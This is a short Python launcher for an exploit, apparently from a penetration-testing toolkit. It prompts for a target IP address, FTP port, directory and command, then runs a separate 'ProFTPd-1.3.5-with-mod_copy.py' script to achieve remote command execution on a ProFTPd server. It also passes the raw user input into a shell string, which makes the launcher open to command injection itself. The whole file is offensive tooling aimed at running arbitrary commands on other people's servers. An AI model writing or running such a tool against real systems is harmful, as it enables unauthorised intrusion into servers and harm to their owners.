import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


class Exploit(object):
    def __init__(self, command, server, directory, port, https_or_http):
        self.command = command
        self.server = server
        self.directory = directory
        self.port = port
        self.https_or_http = https_or_http

    def send(self):
        sub.call(
            f"python3 ProFTPd-1.3.5-with-mod_copy.py -option {self.https_or_http} -p {self.port} -d {self.directory} -s {self.server} -c {self.command}",
            shell=True)


attack = Exploit(https_or_http=input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote Command Execution){Colors.end} [http or https?]:~#"),
                 port=int(input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote Command Execution){Colors.end} [Enter FTP Port]:~#")),
                 directory=input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote Command Execution){Colors.end} [Enter Directory]:~#"),
                 server=input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote Command Execution){Colors.end} [Enter Target Ip Address]:~#"),
                 command=input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote Command Execution){Colors.end} [Enter Command?]:~#"))
if __name__ == "__main__":
    attack.send()
